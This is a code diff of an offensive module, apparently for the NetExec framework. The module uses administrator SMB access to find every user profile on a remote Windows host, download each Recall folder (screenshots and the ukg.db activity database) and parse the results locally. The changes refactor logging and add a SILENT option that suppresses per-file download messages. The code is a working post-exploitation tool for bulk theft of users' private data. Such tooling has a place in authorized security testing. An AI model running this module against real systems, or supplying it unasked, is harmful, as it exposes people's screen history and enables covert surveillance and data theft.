@@ -26,58 +26,61 @@ class NXCModule:
     def options(self, context, module_options):
         """
         USERS           Download only specified user(s); format: -o USERS=user1,user2,user3
+        SILENT          Do not display individual file download messages; set to enable
         """
         self.context = context
-        self.logger = context.log
         self.recall_path_stub = "\\AppData\\Local\\CoreAIPlatform.00\\UKP\\"
-        self.users = module_options["USERS"].split() if "USER" in module_options else None
+        self.users = module_options["USERS"] if "USERS" in module_options else None
+        self.silent = module_options["SILENT"] if "SILENT" in module_options else False
+
 
     def on_admin_login(self, context, connection):
         output_path = f"recall_{connection.host}"
-        self.logger.debug("Getting all user Recall folders")
+        context.log.debug("Getting all user Recall folders")
         user_folders = connection.conn.listPath("C$", "\\Users\\*")
-        self.logger.debug(f"User folders: {user_folders}")
+        context.log.debug(f"User folders: {user_folders}")
         if not user_folders:
-            self.logger.fail("No User folders found!")
+            self.context.log.fail("No User folders found!")
         else:
-            self.logger.success("User folder(s) found, attempting to dump Recall contents (no output means no Recall folder)")
+            context.log.display("User folder(s) found, attempting to dump Recall contents (no output means no Recall folder)")
         
         for user_folder in user_folders:
             if not user_folder.is_directory():
                 continue
             folder_name = user_folder.get_longname()
-            self.logger.debug(f"Folder: {folder_name}")
+            context.log.debug(f"{folder_name=} {self.users=}")
             if folder_name in [".", "..", "All Users", "Default", "Default User", "Public"]:
                 continue
             if self.users and folder_name not in self.users:
-                self.logger.debug(f"Specific users are specified and {folder_name} is not one of them")
+                self.context.log.debug(f"Specific users are specified and {folder_name} is not one of them")
                 continue
             
             recall_path = ntpath.normpath(join(r"Users", folder_name, self.recall_path_stub))
-            self.logger.debug(f"Checking Recall folder {recall_path}")
+            context.log.debug(f"Checking for Recall folder {recall_path}")
             try:
                 connection.conn.listPath("C$", recall_path)
             except Exception:
-                self.logger.debug(f"Recall folder {recall_path} not found!")
+                context.log.debug(f"Recall folder {recall_path} not found!")
                 continue
             user_output_dir = join(output_path, folder_name)
             try:
+                context.log.display(f"Downloading Recall folder for user {folder_name}")
                 connection.download_folder(recall_path, user_output_dir, True)
             except (smb.SessionError, smb3.SessionError):
-                self.logger.debug(f"Folder {recall_path} not found!")
+                context.log.debug(f"Folder {recall_path} not found!")
                 
-            self.logger.success(f"Recall folder for user {folder_name} downloaded to {user_output_dir}")
+            context.log.success(f"Recall folder for user {folder_name} downloaded to {user_output_dir}")
             self.rename_screenshots(user_output_dir)
         
-        self.logger.debug("Parsing Recall DB files...")
+        context.log.debug("Parsing Recall DB files...")
         db_files = glob(f"{output_path}/*/*/ukg.db")
         for db in db_files:
             self.parse_recall_db(db)
 
     def parse_recall_db(self, db_path):
-        self.logger.debug(f"Parsing Recall database {db_path}")
+        self.context.log.debug(f"Parsing Recall database {db_path}")
         parent = abspath(dirname(dirname(db_path)))
-        self.logger.debug(f"Parent: {parent}")
+        self.context.log.debug(f"Parent: {parent}")
         conn = connect(db_path)
         c = conn.cursor()
 
@@ -125,9 +128,9 @@ class NXCModule:
 
     
     def rename_screenshots(self, path):
-        self.logger.debug(f"Renaming screenshots at {path}")
+        self.context.log.debug(f"Renaming screenshots at {path}")
         files = glob(f"{path}/*/ImageStore/*")
-        self.logger.debug(f"Files to rename: {files}")
+        self.context.log.debug(f"Files to rename: {files}")
         for file in files:
             directory, filename = split(file)
             if not splitext(filename)[1]:
